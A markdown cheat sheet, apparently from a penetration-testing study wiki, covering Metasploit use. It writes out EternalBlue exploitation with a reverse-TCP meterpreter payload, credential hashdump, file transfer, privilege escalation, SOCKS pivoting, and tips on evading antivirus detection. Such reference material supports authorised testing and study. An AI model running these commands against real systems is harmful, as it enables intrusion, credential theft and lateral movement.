# Metasploit

!!! tip ""
    Use Metasploit when the exploit module matches the exact target version, you need a stable meterpreter session for post-exploitation, or you need built-in pivoting. Go manual when OSCP rules apply, AV detects the payload, or you need a one-shot exploit without handler overhead.

!!! warning "Watch out"
    Meterpreter is heavily signatured. On hardened targets, use the `shell` stage instead, or generate a custom payload with MSFVenom and a custom encoder.

---

## Starting Metasploit

```bash
msfconsole

# Update (msfupdate is deprecated on Kali)
sudo apt update && sudo apt install --only-upgrade metasploit-framework
```

---

## Searching for Exploits

```bash
search smb
search type:exploit platform:windows
search cve:2021-44228
```

---

## Using an Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
```

---

## Handling Sessions

```bash
sessions -l                  # list all sessions
sessions -i <session-id>     # interact with session
```

Background a session: `Ctrl+Z`

---

## Meterpreter Commands

```bash
sysinfo
getuid
hashdump
shell
upload /local/file C:\\remote\\path
download C:\\remote\\file /local/path
```

---

## Privilege Escalation

```bash
getprivs
run post/windows/escalate/getsystem
```

---

## Pivoting with Metasploit

Add an internal route through a session, then start a SOCKS proxy so any tool can reach the internal network:

```bash
# 1. Add route via meterpreter session
route add 10.10.20.0/24 1
route print

# 2. Start SOCKS5 proxy (modern replacement for socks4a)
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run -j
```

Add to `/etc/proxychains4.conf`:

```
socks5 127.0.0.1 1080
```

```bash
proxychains nmap -sT -Pn 10.10.10.10
```

---

## Automating with Resource Scripts

```bash
msfconsole -r handler.rc
```

See the [Metasploit Resource Scripts](metasploit-resource-scripts.md) page for `.rc` file examples.
